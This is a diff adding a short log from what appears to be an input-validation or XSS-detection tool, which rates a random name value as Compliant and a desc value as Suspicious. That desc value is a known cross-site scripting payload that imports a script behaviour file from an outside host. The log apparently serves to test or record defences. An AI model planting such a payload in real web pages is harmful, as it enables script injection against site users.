@@ -1,0 +1,5 @@
+2016-06-24T08:20:23.610-06:00
+name : nLv:W'.sz1.l' F'
+desc : <html xmlns:xss><?import namespace="xss" implementation="httP://ha.ckers.org/xss.htc"><xss:xss>xss</xss:xss></html>
+The parameter: name :  having value: nLv:W'.sz1.l' F' is: Compliant
+The parameter: desc :  having value: <html xmlns:xss><?import namespace="xss" implementation="httP://ha.ckers.org/xss.htc"><xss:xss>xss</xss:xss></html> is: Suspicious
